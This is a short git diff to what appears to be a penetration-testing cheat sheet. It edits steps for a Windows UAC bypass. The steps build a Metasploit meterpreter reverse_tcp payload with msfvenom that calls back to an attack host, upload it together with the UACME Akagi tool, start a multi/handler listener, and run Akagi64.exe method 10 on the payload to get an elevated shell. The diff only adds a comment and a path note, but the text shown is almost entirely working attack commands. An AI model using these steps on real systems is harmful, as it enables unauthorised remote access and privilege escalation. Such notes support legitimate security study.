@@ -38,7 +38,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attack Host> LPORT=<Port 
 meterpreter > upload exploit.exe .
 meterpreter > upload UACME/Compiled/Akagi32.exe .
 
-background
+# Launch a new instance of MSF
+msfconsole
 use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST <Attack Host>
@@ -49,6 +50,7 @@ sessions -i <Session #>
 
 shell
 Akagi64.exe <Method #> <Current Path>\exploit.exe
+# Must include full path to exploit.exe
 Akagi64.exe 10 C:\Users\Username\Downloads\exploit.exe
 
 # New meterpreter shell created.
